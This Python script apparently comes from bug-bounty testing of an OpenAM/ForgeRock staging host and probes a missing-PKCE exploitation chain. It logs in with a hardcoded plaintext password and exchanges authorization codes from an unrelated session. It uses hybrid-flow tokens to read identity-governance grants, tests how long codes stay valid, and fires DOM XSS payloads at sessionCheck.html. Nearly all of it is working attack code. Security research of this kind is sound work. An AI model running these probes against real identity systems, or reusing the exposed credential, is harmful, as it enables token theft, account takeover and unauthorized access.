# -*- coding: utf-8 -*-
"""AIC 第二十三轮:PKCE 缺失利用链验证
1. code 与发起会话的绑定性(换会话交换是否成功)
2. hybrid 流返回 token 的实际权限(访问 IGA grants)
3. code 过期时间
4. sessionCheck.html 前端逻辑(DOM XSS 面,授权码窃取路径)
"""
import requests, urllib3, json, base64, hashlib, os, time
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
AUTH = BASE + '/am/json/realms/alpha/authenticate'
RU = 'https://openam-bug-bounty-stag.forgeblocks.com/enduser/sessionCheck.html'
USER, PASS = 'pccp', 'Agent360User$5h2!QxR'
MY_ID = 'db3d6356-61a0-4684-9eaa-c1353dfa44d9'

def login():
    S = requests.Session()
    S.trust_env = False
    S.proxies = {'http': None, 'https': None}
    S.headers.update({'User-Agent': 'Mozilla/5.0', 'Accept-API-Version': 'resource=1.0, protocol=1.0',
                      'Content-Type': 'application/json'})
    r = S.post(AUTH, json={}, timeout=15, verify=False)
    d = r.json()
    authId = d['authId']
    cbs = []
    for cb in d.get('callbacks', []):
        t = cb['type']
        inp = [{'name': 'IDToken1', 'value': USER}] if t == 'NameCallback' else \
              [{'name': 'IDToken2', 'value': PASS}] if t == 'PasswordCallback' else \
              [{'name': k.get('name'), 'value': k.get('value')} for k in cb.get('input', [])]
        cbs.append({'type': t, 'output': cb.get('output', []), 'input': inp, '_id': cb.get('_id')})
    S.post(AUTH, json={'authId': authId, 'callbacks': cbs}, timeout=15, verify=False)
    return S

S1 = login()
print('SESSION1 OK')

from urllib.parse import quote

print('\n=== 1. code 与会话绑定性 ===')
# S1 拿 code(无 PKCE,scope=fr:iga:*)
p = '/am/oauth2/realms/alpha/authorize?client_id=endUserUIClient&response_type=code&redirect_uri=%s&scope=%s&state=t' % (
    quote(RU, safe=''), quote('openid fr:iga:*', safe=''))
r = S1.get(BASE + p, timeout=15, verify=False, allow_redirects=False)
loc = r.headers.get('Location', '')
code = loc.split('code=')[1].split('&')[0] if 'code=' in loc else None
print('S1 got code:', code[:40] if code else None)

# 用全新会话 S2(无 cookie)交换
S2 = requests.Session()
S2.trust_env = False
S2.proxies = {'http': None, 'https': None}
if code:
    r2 = S2.post(BASE + '/am/oauth2/realms/alpha/access_token',
                 data={'grant_type': 'authorization_code', 'code': code,
                       'redirect_uri': RU, 'client_id': 'endUserUIClient'}, timeout=12, verify=False)
    print('S2(新会话) exchange:', r2.status_code, r2.text[:200].replace('\n', ' '))
    if r2.status_code == 200:
        tok2 = r2.json().get('access_token', '')
        print('TOKEN S2:', tok2[:60])
        # 验证 token 可用性:访问 IGA grants(不带 cookie)
        S3 = requests.Session()
        S3.trust_env = False
        S3.proxies = {'http': None, 'https': None}
        S3.headers.update({'Authorization': 'Bearer ' + tok2})
        r3 = S3.get(BASE + '/iga/governance/user/%s/grants?pageSize=10' % MY_ID, timeout=12, verify=False)
        print('IGA grants with S2-token(no cookie):', r3.status_code, r3.text[:150].replace('\n', ' '))

print('\n=== 2. hybrid 流(code+token)token 权限 ===')
p = '/am/oauth2/realms/alpha/authorize?client_id=endUserUIClient&response_type=code+token&redirect_uri=%s&scope=%s&state=t' % (
    quote(RU, safe=''), quote('openid fr:iga:*', safe=''))
r = S1.get(BASE + p, timeout=15, verify=False, allow_redirects=False)
loc = r.headers.get('Location', '')
print('hybrid Location:', loc[:250])
# fragment 里的 access_token
frag = loc.split('#')[1] if '#' in loc else ''
params = dict(kv.split('=') for kv in frag.split('&') if '=' in kv)
tok_hyb = params.get('access_token', '')
code_hyb = params.get('code', '')
print('hybrid access_token:', tok_hyb[:50] if tok_hyb else 'NONE')
print('hybrid code:', code_hyb[:40] if code_hyb else 'NONE')
if tok_hyb:
    S4 = requests.Session()
    S4.trust_env = False
    S4.proxies = {'http': None, 'https': None}
    S4.headers.update({'Authorization': 'Bearer ' + tok_hyb})
    r4 = S4.get(BASE + '/iga/governance/user/%s/grants?pageSize=10' % MY_ID, timeout=12, verify=False)
    print('IGA grants with hybrid-token:', r4.status_code, r4.text[:150].replace('\n', ' '))

print('\n=== 3. code 过期时间 ===')
p = '/am/oauth2/realms/alpha/authorize?client_id=endUserUIClient&response_type=code&redirect_uri=%s&scope=openid&state=t' % quote(RU, safe='')
r = S1.get(BASE + p, timeout=15, verify=False, allow_redirects=False)
loc = r.headers.get('Location', '')
code = loc.split('code=')[1].split('&')[0] if 'code=' in loc else None
print('code:', code[:40] if code else None)
for wait in [0, 30, 60]:
    if code:
        time.sleep(wait)
        r2 = S1.post(BASE + '/am/oauth2/realms/alpha/access_token',
                    data={'grant_type': 'authorization_code', 'code': code,
                          'redirect_uri': RU, 'client_id': 'endUserUIClient'}, timeout=12, verify=False)
        print('after %ds exchange: %d %s' % (wait, r2.status_code, r2.text[:120].replace('\n', ' ')))

print('\n=== 4. sessionCheck 前端 DOM XSS 面 ===')
# 4a. fragment 注入
for frag in ['<script>alert(1)</script>', 'javascript:alert(1)', 'url=javascript:alert(1)',
             '?a=1#<img src=x onerror=alert(1)>']:
    try:
        r = S1.get(BASE + '/enduser/sessionCheck.html#' + quote(frag, safe=''), timeout=12, verify=False)
        print('frag %-40s -> %d len=%d' % (frag[:40], r.status_code, len(r.text)))
    except Exception as e:
        print('frag %-40s -> ERR %s' % (frag[:40], str(e)[:60]))
# 4b. 下载 JS 看是否有 DOM 操作
r = S1.get(BASE + '/enduser/sessionCheckFrame.js', timeout=12, verify=False)
print('\nsessionCheckFrame.js (%d bytes) head:\n%s' % (len(r.text), r.text[:1500]))
